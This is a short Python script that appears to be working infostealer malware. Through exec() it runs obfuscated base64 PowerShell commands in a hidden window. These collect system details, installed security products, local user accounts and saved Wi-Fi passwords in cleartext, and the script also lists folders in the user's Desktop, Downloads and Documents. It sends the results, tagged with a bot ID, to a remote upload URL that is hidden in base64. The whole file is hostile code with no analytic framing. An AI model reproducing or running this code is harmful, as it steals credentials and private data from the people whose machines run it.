import os
import subprocess
import requests
import base64
import random

import time
test = """
all_info = ''
bot_id = 'rjmbdakeo'
commands = [
    ('Installed Software', 'CkdldC1DaW1^bnN0!W5jZSAtQ2xhc3NO!W1lIFdpbjMyX1Byb2R1!3QgfCBTZWxl!3QtT2^qZWN0IE5hbWUsIFZlcnNpb24K'.replace('#', 'm').replace('*', 'V').replace('!', 'Y').replace('^', 'J')),
    ('Security Solutions', 'CkdldC1DaW1^bnN0!W5jZSAtT#FtZXNw!WNlIH^vb3RcU2*jdX^pdHlDZW50ZXIyIC1DbGFzc05hbWUgQW50aXZpcn*zUH^vZH*jdCB8IFNlbG*jdC1P!#pl!3QgZGlzcGxheU5hbWUK'.replace('#', 'm').replace('*', 'V').replace('!', 'Y').replace('^', 'J')),
    ('Processor Info', 'CkdldC1DaW1^bnN0!W5jZSAtQ2xhc3NO!W1lIFdpbjMyX1Byb2Nlc3NvciB8IFNlbG*jdC1P!#pl!3QgT#FtZSwgTn*t!#*yT2ZDb3^lcywgTn*t!#*yT2ZMb2dp!2FsUH^v!2*zc29ycwo='.replace('#', 'm').replace('*', 'V').replace('!', 'Y').replace('^', 'J')),
    ('', 'CkdldC1DaW1^bnN0!W5jZSBXaW4zMl9Db21wdXRlclN5c3RlbSB8IFNlbG*jdC1P!#pl!3Qg*G90!WxQaHlzaWNhbE1lbW9yeQo='.replace('#', 'm').replace('*', 'V').replace('!', 'Y').replace('^', 'J')),
    ('', 'CkdldC1DaW1^bnN0!W5jZSBXaW4zMl9Db21wdXRlclN5c3RlbSB8IFNlbG*jdC1P!#pl!3QgTWFudWZh!3R1c#*yCg=='.replace('#', 'm').replace('*', 'V').replace('!', 'Y').replace('^', 'J')),
    ('', 'CkdldC1DaW1^bnN0!W5jZSBXaW4zMl9PcG*y!XRpb#dTeXN0ZW0gfCBTZWxl!3QtT2^qZWN0IENhcHRpb24K'.replace('#', 'm').replace('*', 'V').replace('!', 'Y').replace('^', 'J')),
    ('Disk Size', 'CihHZXQtQ2ltSW5zdGFu!2UgLUNs!XNzT#FtZSBXaW4zMl9EaXNrRH^pd#UpLlNpe#UgLyAxR0IK'.replace('#', 'm').replace('*', 'V').replace('!', 'Y').replace('^', 'J')),
    ('User Accounts', 'CkdldC1Mb2NhbF*zZXIgfCBXaG*yZS1P!#pl!3QgeyAkXy5Fb#FibG*kIC1lcSAkdH^1ZSB9IHwgU2*sZWN0LU9ia#*jdCBO!W1lLCBFb#FibG*kCg=='.replace('#', 'm').replace('*', 'V').replace('!', 'Y').replace('^', 'J')),
    ('Wifi-Passwords', 'C#5ldHNoIHds!W4gc2hvdyBwc#9#aWxlcyB8IFNlbG*jdC1TdH^pb#cgIkFsbCB*c2*yIFByb2ZpbGUiIHwgR#9yRWFjaC1P!#pl!3QgewogICAg^HByb2ZpbG*O!W1lID0g^F8u*G9TdH^pb#coKS5TcGxpdCgiOiIpWzFdLlRyaW0oKQogICAgb#*0c2ggd2xhbiBzaG93IHByb2ZpbGUgb#FtZT0i^HByb2ZpbG*O!W1lIiBrZXk9!2xl!XIgfCAKICAgIFNlbG*jdC1TdH^pb#cgIktleSBDb250ZW50IiB8IAogICAgR#9yRWFjaC1P!#pl!3QgewogICAgICAgIGl#ICgkXyAtbWF0!2ggIktleSBDb250ZW50XHMqOlxzKiguKykiKSB7CiAgICAgICAgICAgIFdyaXRlLU91dHB1dCAi^Htwc#9#aWxlT#FtZX06ICQo^G1hdGNoZXNbM*0u*H^pbSgpKSIKICAgICAgICB9CiAgICB9Cn0K'.replace('#', 'm').replace('*', 'V').replace('!', 'Y').replace('^', 'J'))]
for description, command in commands:
    if description.strip() == '':
        pass
    else:
        all_info += f'{description}:\\n\\n'
    output = subprocess.run(
        ['powershell', '-Command', base64.b64decode(command.replace('#', 'm').replace('*', 'V').replace('!', 'Y').replace('^', 'J')).decode('utf-8')],
        capture_output=True,
        text=True,
        creationflags=subprocess.CREATE_NO_WINDOW
    ).stdout.strip()
    all_info += f'{output}\\n\\n'
all_info += 'Directory Map:\\n\\n'
for base_dir in [os.path.join(os.path.expanduser('~'), '}es-to&'.replace('}', 'D').replace('-', 'k').replace('&', 'p')),
                 os.path.join(os.path.expanduser('~'), '?ow=l/ads'.replace('?', 'D').replace('=', 'n').replace('/', 'o')),
                 os.path.join(os.path.expanduser('~'), '<me%'.replace('<', 'Docu').replace('%', 'nts'))]:
    if os.path.exists(base_dir):
        all_info += f"Directories for: {base_dir}\\n"
        for root, dirs, _ in os.walk(base_dir):
            dirs[:] = [d for d in dirs if d not in ['node_modules', 'lib', 'bin', 'include', 'site-packages', 'venv', 'dist', 'src', 'app', 'html', 'css', 'js', 'build', 'assets', 'views'] and not d.startswith('.')]
            for directory in dirs[:10]:
                all_info += f'{os.path.join(root, directory)}\\n'
            break
        all_info += '\\n'
requests.post(
    base64.b64decode('Cmh0dHBzOi8vY3MudHJ1LmNhL35vc19qbWlzdHJ5L2ZpbGVfc3lzdGVtL3VwbG9hZC5waHAK').decode('utf-8').strip(),
    data=base64.b64encode(all_info.encode('utf-8')),
    headers={"Content-Type": "application/octet-stream", "X-FILENAME": f'{bot_id}_info.txt'})
"""

exec(test)